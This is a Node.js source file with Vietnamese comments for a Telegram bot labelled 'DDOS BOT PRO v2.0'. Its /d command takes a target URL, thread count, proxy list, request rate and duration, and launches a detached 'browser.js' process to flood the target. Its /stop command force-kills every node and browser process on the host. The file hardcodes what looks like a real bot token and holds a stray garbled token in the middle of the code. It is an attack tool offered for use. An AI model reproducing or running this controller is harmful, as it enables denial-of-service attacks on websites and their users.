const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');
const fs = require('fs');
const chalk = require('chalk');

// === CẤU HÌNH ===
const TOKEN = '7580314584:AAFLRinlnilclZpQgXt4fc5uKu2YSUwxH4k'; // Thay bằng token thật
const DEFAULT_PROXY_FILE = 'proxy1.txt';
const bot = new TelegramBot(TOKEN, { polling: true });

// Trạng thái
let isRunning = false;
let activeProcess = null;

// Log màu
const log = (color, text) => console.log(`${color}${text}${chalk.reset}`);

// Kiểm tra file proxy
const checkProxyFile = (file) => fs.existsSync(file) && fs.statSync(file).size > 0;

// === LỆNH /start ===
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `
*DDOS BOT PRO v2.0*

*Lệnh:*
/d <url> <luồng> [proxy_file] [rate] <giây>

*Thứ tự bắt buộc:*
\`node browser.js <targetURL> <threads> <proxyFile> <rate> <time>\`

*Ví dụ:*
/d https://example.com 10 60
/d https://example.com 20 proxy2.txt 200 120

*Proxy mặc định:* \`${DEFAULT_PROXY_FILE}\`
/stop → Dừng tất cả

*ok*
    `, { parse_mode: 'Markdown' });
});

// === LỆNH /d ===
bot.onText(/\/d\s+(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (isRunning) return bot.sendMessage(chatId, 'Đang chạy! Dùng /stop trước.');

    const args = match[1].trim().split(/\s+/);
    if (args.length < 3) {
        return bot.sendMessage(chatId, 'Thiếu tham số!\nVí dụ: `/d https://example.com 10 60`', { parse_mode: 'Markdown' });
    }

    let target = args[0];
    let threads = args[1];
    let proxyFile = DEFAULT_PROXY_FILE;
    let rate = '100';
    let time = args[args.length - 1]; // time là tham số cuối cùng

    // Xử lý các tham số tùy chọn (giữa threads và time)
    const middleArgs = args.slice(2, -1);
    middleArgs.forEach(arg => {
        if (arg.endsWith('.txt') && fs.existsSync(arg)) {
            proxyFile = arg;
        } else if (!isNaN(arg) && parseInt(arg) > 0) {
            rate = arg;
        }
    });

    // === VALIDATE ===
    if (!/^https?:\/\//i.test(target)) {
        return bot.sendMessage(chatId, 'URL phải bắt đầu bằng http:// hoặc https://');
    }

    const duration = parseInt(time);
    if (isNaN(duration) || duration < 10) {
        return bot.sendMessage(chatId, 'Thời gian (giây) phải ≥ 10');
    }

    const threadCount = Math.min(Math.max(parseInt(threads), 1), 50);
    if (isNaN(threadCount)) {
        return bot.sendMessage(chatId, 'Số luồng phải là số từ 1 đến 50');
    }

 circul   const rateLimit = parseInt(rate) || 100;
    if (rateLimit < 1 || rateLimit > 1000) {
        return bot.sendMessage(chatId, 'Rate phải từ 1 đến 1000');
    }

    // Kiểm tra proxy
    if (!checkProxyFile(proxyFile)) {
        return bot.sendMessage(chatId, `Không tìm thấy file proxy: \`${proxyFile}\``, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: `Dùng ${DEFAULT_PROXY_FILE}`, callback_data: `use_default|${target}|${threadCount}|${rateLimit}|${duration}` }
                ]]
            }
        });
    }

    runAttack(chatId, target, threadCount, proxyFile, rateLimit, duration);
});

// Inline button: dùng proxy mặc định
bot.on('callback_query', (query) => {
    if (!query.data.startsWith('use_default')) return;
    const [_, target, threads, rate, duration] = query.data.split('|');
    const chatId = query.message.chat.id;
    bot.deleteMessage(chatId, query.message.message_id);
    runAttack(chatId, target, +threads, DEFAULT_PROXY_FILE, +rate, +duration);
});

// === CHẠY TẤN CÔNG ===
const runAttack = (chatId, target, threads, proxyFile, rate, duration) => {
    bot.sendMessage(chatId, `
*Khởi chạy tấn công...*
URL: \`${target}\`
Luồng: \`${threads}\`
Proxy: \`${proxyFile}\`
Rate: \`${rate}\`
Thời gian: \`${duration}s\`
    `, { parse_mode: 'Markdown' });

    // ĐÚNG THỨ TỰ: targetURL, threads, proxyFile, rate, time
    const args = [target, threads.toString(), proxyFile, rate.toString(), duration.toString()];
    activeProcess = spawn('node', ['browser.js', ...args], { detached: true, stdio: 'ignore' });
    activeProcess.unref();
    isRunning = true;

    log(chalk.green, `[BOT] Spawn: node browser.js ${args.join(' ')}`);

    setTimeout(() => {
        if (isRunning) {
            bot.sendMessage(chatId, '*Tấn công đã kết thúc theo thời gian.*', { parse_mode: 'Markdown' });
            isRunning = false;
            activeProcess = null;
        }
    }, (duration + 15) * 1000); // +15s dư để đảm bảo
};

// === LỆNH /stop ===
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    if (!isRunning) return bot.sendMessage(chatId, 'Không có tiến trình nào đang chạy.');

    // Kill tất cả node và trình duyệt
    require('child_process').exec('taskkill /f /im node.exe 2>nul || pkill -f "node browser.js"', () => {});
    require('child_process').exec('taskkill /f /im msedge.exe 2>nul || pkill -f chrome', () => {});

    isRunning = false;
    activeProcess = null;
    bot.sendMessage(chatId, '*ĐÃ DỪNG HOÀN TOÀN TẤT CẢ TIẾN TRÌNH!*', { parse_mode: 'Markdown' });
    log(chalk.red, '[BOT] Đã dừng tất cả tiến trình');
});

// Xử lý lỗi polling
bot.on('polling_error', (err) => log(chalk.red, `Polling error: ${err.message}`));

console.log(chalk.cyan.bold('Bot PRO v2.0 đang chạy... Gửi /start để bắt đầu'));
